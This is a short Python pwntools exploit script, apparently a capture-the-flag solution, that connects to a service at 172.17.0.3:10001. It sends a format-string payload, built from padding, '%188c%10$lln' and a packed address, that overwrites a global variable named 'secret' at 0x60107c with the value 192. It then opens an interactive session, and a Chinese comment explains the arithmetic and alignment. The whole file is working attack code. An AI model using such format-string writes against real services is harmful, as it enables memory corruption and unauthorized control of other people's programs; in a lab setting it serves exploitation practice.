#!/usr/bin/python
#coding:utf-8

from pwn import *

io = remote('172.17.0.3', 10001)
context.update(arch = 'amd64', os = 'linux')

io.sendline("aaaa%188c%10$lln\x7c\x10\x60\x00\x00\x00\x00\x00")		#将全局变量secret所在的地址0x60107c内容改成192，aaaa用于使地址在栈中对齐，然后写188个字符，188+4个'a'=192，后面填充l\x00防止回车符\x0a出现在地址中

io.interactive()